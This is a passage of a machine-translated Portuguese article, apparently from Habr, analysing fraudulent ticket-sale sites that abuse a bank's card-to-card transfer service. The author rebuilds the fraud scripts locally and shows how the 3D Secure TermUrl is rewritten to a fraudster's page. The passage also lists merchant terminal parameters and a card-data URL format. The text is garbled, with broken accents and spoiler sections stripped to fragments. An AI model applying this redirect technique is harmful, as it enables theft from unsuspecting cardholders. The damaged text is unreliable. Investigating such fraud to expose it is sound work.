Antes de testar com um cart√£o de cr√©dito v√°lido, presumi que, para confirmar o c√≥digo do 3D Secure, ele teria que ser "enganado" para o usu√°rio de alguma forma e depois transferisse secretamente programaticamente a confirma√ß√£o do 3D Secure para este formul√°rio. No entanto, tudo acabou sendo muito mais simples. Depois que os dados para a transfer√™ncia de cart√£o para cart√£o s√£o enviados ao site do Promsvyazbank, o navegador exibe a forma do banco emissor do cart√£o a partir do qual a transfer√™ncia √© feita. No meu caso, este √© o Sberbank. Este formul√°rio nem precisa ser falsificado. O formul√°rio de confirma√ß√£o √© exibido no site HTTPS do Sberbank. As v√≠timas dos pr√≥prios fraudadores diretamente neste formul√°rio familiar a eles inserem um c√≥digo de confirma√ß√£o. Depois disso, se a transfer√™ncia for aprovada, o dinheiro ser√° debitado. Embora seja teoricamente poss√≠vel protestar contra essa transfer√™ncia, est√° longe do fato de que o dinheiro ser√° devolvido.A probabilidade de um reembolso √© afetada por muitos fatores, incluindo a rapidez com que a "v√≠tima" ser√° aplicada ao seu banco.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
C√≥digo HTML da p√°gina que o Sberbank distribui para confirmar o 3D Secure sob o spoiler. </font><font style="vertical-align: inherit;">O c√≥digo foi obtido durante o teste gravando a vari√°vel $ page em um arquivo de texto. </font><font style="vertical-align: inherit;">Linha 166 do script payp2p.php.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C√≥digo de p√°gina HTML seguro 3D antes da substitui√ß√£o da linha</font></font></b><div class="spoiler_text"><pre><code class="html hljs xml"><span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HTML</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HEAD</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HEAD</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">BODY</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ONLOAD</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"javascript:OnLoadEvent();"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">FORM</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ACTION</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://acs3.sbrf.ru:443/acs/pa?id=QAB6XaYQTRm-t_6DHVnp2Q"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">METHOD</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"post"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">NAME</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"ThreeDform"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">target</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"_self"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"PaReq"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"eJxVUmFPgzAQ/SuE966lY2iWo4aJOl1mcG7TfTK1VCCOwkpR9u9tJ3P6pbn37nLv+u7gsiu3zqdQTVHJ0PUG2HWE5FVayCx0V8ubswv3ksIyV0LET4K3SlCYi6ZhmXCKNHSTaCF24+doErywzeNyUZ7p1yCermVNHl0KhzSFXoCa/gMC6AhNJ8VzJjUFxneTuwfqYzLC54B6CKVQdzHFGAfYI8TH/pB4GNAPDZKVgl5Fi5jYx0meJtHDbLBYATpkgFet1GpPA38I6AigVVuaa12PEaqbNyY/BqoFZFlAp4GS1kaN6dIVKZ2pgu2f41s565JNs84SKbL9+z0bbXkIyFZAyrSgBHuBhz3fwcGYjMZDo3vggZVWnnojbMbvAdRWI/qb+cuAcVuZZRznPyIQXV1JYSqMlb8xpKLhVBf8Q2inZnsjbAlAp49cTa3PXBvrSKp1rqOvbZJVs/VXdPuez7vdZj59uw6t+4ciK1QYx7xz63kPANk2qF8s6m/BRP9u5BtPwMYZ"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"MD"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"161732779-506DEA0AD5677154"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"TermUrl"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://3ds.payment.ru/cgi-bin/cgi_link"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">FORM</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SCRIPT</span></span></span><span class="hljs-tag">&gt;</span></span><span class="javascript"><span class="javascript">
</span><span class="hljs-function"><span class="hljs-keyword"><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><span class="javascript"><span class="hljs-function"> </span></span><span class="hljs-title"><span class="javascript"><span class="hljs-function"><span class="hljs-title">OnLoadEvent</span></span></span></span><span class="javascript"><span class="hljs-function"> (</span></span><span class="hljs-params"></span><span class="javascript"><span class="hljs-function"><span class="hljs-params"></span>) 
</span></span></span><span class="javascript">{
  </span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">document</span></span></span><span class="javascript">.forms[</span><span class="hljs-number"><span class="javascript"><span class="hljs-number">0</span></span></span><span class="javascript">].submit();
}
</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SCRIPT</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">BODY</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HTML</span></span></span><span class="hljs-tag">&gt;</span></span>
</code></pre></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
C√≥digo HTML da p√°gina depois que ela substitui parte do texto, abaixo do spoiler. </font><font style="vertical-align: inherit;">O c√≥digo foi obtido durante o teste gravando a vari√°vel $ pp em um arquivo de texto. </font><font style="vertical-align: inherit;">Linha 174 do script payp2p.php.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C√≥digo HTML da p√°gina segura 3D ap√≥s a substitui√ß√£o da linha</font></font></b><div class="spoiler_text"><pre><code class="html hljs xml"><span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HTML</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HEAD</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HEAD</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">BODY</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ONLOAD</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"javascript:OnLoadEvent();"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">FORM</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ACTION</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://acs3.sbrf.ru:443/acs/pa?id=QAB6XaYQTRm-t_6DHVnp2Q"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">METHOD</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"post"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">NAME</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"ThreeDform"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">target</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"_self"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"PaReq"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"eJxVUmFPgzAQ/SuE966lY2iWo4aJOl1mcG7TfTK1VCCOwkpR9u9tJ3P6pbn37nLv+u7gsiu3zqdQTVHJ0PUG2HWE5FVayCx0V8ubswv3ksIyV0LET4K3SlCYi6ZhmXCKNHSTaCF24+doErywzeNyUZ7p1yCermVNHl0KhzSFXoCa/gMC6AhNJ8VzJjUFxneTuwfqYzLC54B6CKVQdzHFGAfYI8TH/pB4GNAPDZKVgl5Fi5jYx0meJtHDbLBYATpkgFet1GpPA38I6AigVVuaa12PEaqbNyY/BqoFZFlAp4GS1kaN6dIVKZ2pgu2f41s565JNs84SKbL9+z0bbXkIyFZAyrSgBHuBhz3fwcGYjMZDo3vggZVWnnojbMbvAdRWI/qb+cuAcVuZZRznPyIQXV1JYSqMlb8xpKLhVBf8Q2inZnsjbAlAp49cTa3PXBvrSKp1rqOvbZJVs/VXdPuez7vdZj59uw6t+4ciK1QYx7xz63kPANk2qF8s6m/BRP9u5BtPwMYZ"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"MD"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"161732779-506DEA0AD5677154"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"TermUrl"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://p2p.localhost/sus.php?cd=BX3FKT"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">FORM</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SCRIPT</span></span></span><span class="hljs-tag">&gt;</span></span><span class="javascript"><span class="javascript">
</span><span class="hljs-function"><span class="hljs-keyword"><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><span class="javascript"><span class="hljs-function"> </span></span><span class="hljs-title"><span class="javascript"><span class="hljs-function"><span class="hljs-title">OnLoadEvent</span></span></span></span><span class="javascript"><span class="hljs-function"> (</span></span><span class="hljs-params"></span><span class="javascript"><span class="hljs-function"><span class="hljs-params"></span>) 
</span></span></span><span class="javascript">{
  </span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">document</span></span></span><span class="javascript">.forms[</span><span class="hljs-number"><span class="javascript"><span class="hljs-number">0</span></span></span><span class="javascript">].submit();
}
</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SCRIPT</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">BODY</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">HTML</span></span></span><span class="hljs-tag">&gt;</span></span>
</code></pre></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Em resumo, no c√≥digo HTML da p√°gina 3D Secure (neste exemplo, do Sberbank), a linha:</font></font><br>
<br>
<pre><code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"TermUrl"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://3ds.payment.ru/cgi-bin/cgi_link"</span></span></span><span class="hljs-tag">&gt;</span></span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Altera programaticamente para:</font></font><br>
 <br>
<pre><code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"TermUrl"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://p2p.localhost/sus.php?cd=BX3FKT"</span></span></span><span class="hljs-tag">&gt;</span></span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
A sequ√™ncia de substitui√ß√£o √© o endere√ßo da p√°gina para a qual o cart√£o banc√°rio emissor do remetente, depois de verificar o c√≥digo 3D Secure, deve devolver o usu√°rio. Antes do script substituir a linha, o site do Promsvyazbank era especificado como o endere√ßo de retorno. Depois que o script substituiu a linha, alguma p√°gina no site fraudulento j√° √© indicada como o endere√ßo de retorno.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
N√£o entendo completamente em que ponto exato o endere√ßo de retorno est√° sendo substitu√≠do, mas funciona. Nesse momento, quando o navegador exibe a p√°gina https do Sberbank com uma solicita√ß√£o para inserir o c√≥digo 3D Secure, se voc√™ observar o c√≥digo HTML de origem da p√°gina no navegador, n√£o haver√° endere√ßo de retorno em nenhum site. O c√≥digo HTML desta p√°gina tem um comprimento de mais de 400 linhas e √© completamente diferente do c√≥digo HTML da p√°gina de resposta do Sberbank apresentada acima, que foi capturada gravando as vari√°veis ‚Äã‚Äã$ page (linha 166) e $ pp (linha 174) no disco.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Se voc√™ digitar o c√≥digo 3D Secure errado, o Sberbank em sua p√°gina exibir√° uma mensagem informando que o c√≥digo est√° incorreto e envia outro SMS. Assim que o c√≥digo correto √© inserido, ele √© redirecionado ao site de pagamento ou ao site de substitui√ß√£o. Ou seja, provavelmente, o redirecionamento para o pr√≥prio site de pagamento implica que do Sberbank todos os procedimentos necess√°rios foram conclu√≠dos. O Sberbank aqui serve como um exemplo para testes. A transfer√™ncia tamb√©m pode ser feita atrav√©s de outro banco.</font></font><br>
<br>
<img src="https://habrastorage.org/files/67f/61d/011/67f61d0110d6481ca5115d314953530c.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Do lado do "comprador do ingresso", fica assim. O comprador em uma forma de pagamento pr√©-preparada digita o n√∫mero do seu cart√£o. Depois disso, a p√°gina de confirma√ß√£o do c√≥digo 3D Secure √© exibida quase imediatamente e um SMS com um c√≥digo de confirma√ß√£o chega. A p√°gina 3D Secure no navegador √© exibida no site do banco do emissor do cart√£o do comprador usando o protocolo HTTPS. A p√°gina com o formul√°rio para inserir o n√∫mero do cart√£o pode parecer suspeita, mas a confirma√ß√£o do 3D Secure no site do seu banco n√£o causa nenhuma d√∫vida ou suspeita. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
A prop√≥sito, preste aten√ß√£o √† assinatura ‚Äúticket pay‚Äù na linha ‚ÄúDescription‚Äù na p√°gina 3D Secure do Sberbank. Essa assinatura √© configurada no script payp2p.php. Em exemplos futuros, tentaremos mudar isso. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vamos voltar aos testes.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Digitei o c√≥digo do SMS na p√°gina do Sberbank e, depois de clicar no bot√£o "Enviar", recebi um aviso de que os dados seriam enviados por uma conex√£o n√£o segura. </font></font><br>
<br>
<img src="https://habrastorage.org/files/f0c/33c/ce6/f0c33cce63e54f30b07837ae52bd52c8.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Depois de confirmar que concordo com o envio de dados por uma conex√£o n√£o segura, fui redirecionado para a </font></font><br>
<br>
<img src="https://habrastorage.org/files/e86/a82/2f6/e86a822f66024701ade52e4bc3388a38.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
p√°gina </font><font style="vertical-align: inherit;">/sus.php?cd=‚Ä¶ </font><font style="vertical-align: inherit;">. Esta √© a p√°gina de retorno. O endere√ßo de retorno √© definido no script. Nesse caso, a p√°gina n√£o foi encontrada. Mas o motivo √© claro - a p√°gina de retorno n√£o foi preparada com anteced√™ncia. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Embora o objetivo tenha sido quase alcan√ßado, o </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dinheiro de cart√£o para cart√£o realmente n√£o passou</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . N√£o houve sms adicionais com informa√ß√µes de que o pagamento foi recusado, etc.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Decidi que o motivo da falha na primeira tentativa foi que o site local (localhost) funcionava em uma conex√£o http insegura e o site Sberbank em um protocolo http seguro. Http e https n√£o s√£o muito amig√°veis ‚Äã‚Äãentre si. A prop√≥sito, isso explica por que os sites fraudulentos descritos na primeira parte da publica√ß√£o usavam uma conex√£o https segura, embora com o certificado mais simples. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Para verificar essa suposi√ß√£o, tive que configurar o protocolo https no site local. Para fazer isso, um dom√≠nio local p2p.localhost e um certificado autoassinado foram criados. Como resultado, o novo endere√ßo com o script de teste come√ßou a ter a seguinte apar√™ncia: Al√©m </font></font><br>
<br>
<code>https://p2p.localhost/payp2p.php</code><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
disso, o endere√ßo da p√°gina para a qual o retorno deve ser feito ap√≥s a inser√ß√£o do c√≥digo 3D Secure foi alterado no script. A p√°gina de retorno em si tamb√©m foi pr√©-preparada.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Estamos tentando novamente efetuar um pagamento com um site local que funciona atrav√©s do protocolo https. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Quando voc√™ se conecta pela primeira vez, o navegador jura naturalmente na conex√£o segura configurada incorretamente. Isso se deve ao fato de termos um certificado autoassinado. </font></font><br>
<br>
<img src="https://habrastorage.org/files/8d1/ff3/73f/8d1ff373f65d4f70af5fa16538e13d5d.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Como a fonte do certificado √© conhecida, n√≥s as adicionamos √†s exce√ß√µes. </font></font><br>
<br>
<img src="https://habrastorage.org/files/06a/317/d22/06a317d220884c5b93844dff1929907e.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
S√≥ isso. Agora a conex√£o √© feita via https e, ao mudar do site do Sberbank, os avisos desaparecem. </font></font><br>
<br>
<img src="https://habrastorage.org/files/df9/2c7/ad5/df92c7ad553e492e9192167abb150826.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Depois de inserir o c√≥digo 3D Secure, o retorno √† p√°gina especialmente preparada √© realizado corretamente. </font></font><br>
<br>
<img src="https://habrastorage.org/files/0a7/21a/677/0a721a677a9a46e68605c7f03beb4bc4.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tudo funciona bem, exceto </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">que o dinheiro realmente n√£o funciona</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . Como resultado, tive que testar e pesquisar por v√°rios dias, qual poderia ser o motivo.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Eu tinha apenas parte dos arquivos usados ‚Äã‚Äãem um dos sites fraudulentos de passagens a√©reas. Entre os arquivos que foram enviados para mim, havia um arquivo payment.php. Isso √© semelhante ao script analisado acima. A julgar pelo c√≥digo, provavelmente foi criado n√£o para enganar os visitantes no "site de combate", mas para testar por um programador-desenvolvedor a possibilidade de transferir de um cart√£o para outro atrav√©s do servi√ßo 3ds.payment.ru. √â improv√°vel, mas teoricamente, nas primeiras vers√µes de sites fraudulentos, poderia ser usado n√£o apenas para testes. </font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Tentei efetuar um pagamento usando o script payment.php alternativo e o pagamento passou na primeira vez.</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">A √∫nica coisa que a confirma√ß√£o do pagamento bem-sucedido foi exibida no site 3ds.payment.ru. </font><font style="vertical-align: inherit;">Decidi que, como esse script funciona, ser√° poss√≠vel encontrar o motivo pelo qual o primeiro script da descri√ß√£o (payp2p.php) n√£o funciona.</font></font><br>
<br>
<img src="https://habrastorage.org/files/113/941/882/1139418821c64ae4a67cdefba3b3fd59.png"><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C√≥digo completo do script payment.php sob o spoiler</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/c65/c1f/56d/c65c1f56d0fe4e8c895bfbcd98109349.png"><br>
     .<br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Descri√ß√£o das diferen√ßas entre os scripts payment.php e payp2p.php</font></font></b><div class="spoiler_text">     .    .<br>
<br>
 payp2p.php       POST  .  payment.php     GET    .  ,      ,       :<br>
<br>
<code>https://p2p.localhost/payment.php?card_1=1111&amp;card_2=2222...&amp;cvc=999...&amp;price=30... </code><br>
<br>
    ,         ¬´ ¬ª.<br>
<br>
Payment.php    payp2p.php       MySQL.        .       .<br>
<br>
Payment.php      .        ,     .   ,  payp2p.php    ,   ,  payment.php      . TERMINAL=24043210, MERCH_NAME=PSB, MERCHANT=000601224043202, EMAIL=lakhtin%40psbank.ru, TRTYPE=8 (    TRTYPE    .   payp2p.php  ).<br>
<br>
  ‚Äî payment.php         <code>https://3ds.payment.ru/cgi-bin/is_3DS</code>.          <code>{"IS_ACTIVE":"Y"}</code>      ,        (   3D Secure).<br>
<br>
    .      payment.php     .  ,        3ds.payment.ru.<br>
</div></div><br>
<blockquote>  ‚Ä¶  ,       Firefox,  ¬´¬ª  payment.php      (¬´Firefox/3.0.3¬ª),  ,          , ,           . ,  3.5 Firefox    2009 ,  4 Firefox     2011,      payp2p.php ,  ¬´Firefox/38.0¬ª,      2016  ‚Äî Firefox 49.</blockquote><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Houve tentativas de corrigir o script payp2p.php que n√£o estava funcionando por algum motivo, de corrigi-lo, tomando como base o script de trabalho. V√°rias op√ß√µes foram tentadas. Todos os trechos de c√≥digo que de alguma forma poderiam afetar o trabalho, por sua vez, foram transferidos do script de trabalho para o que n√£o funcionava. Entre outras coisas, houve uma tentativa de uma conex√£o intermedi√°ria adicional com </font></font><code>https://3ds.payment.ru/cgi-bin/is_3DS</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">; alterar, ativar e desativar as op√ß√µes cURL, etc. Nada ajudou, a flor de pedra n√£o saiu. </font></font><br>
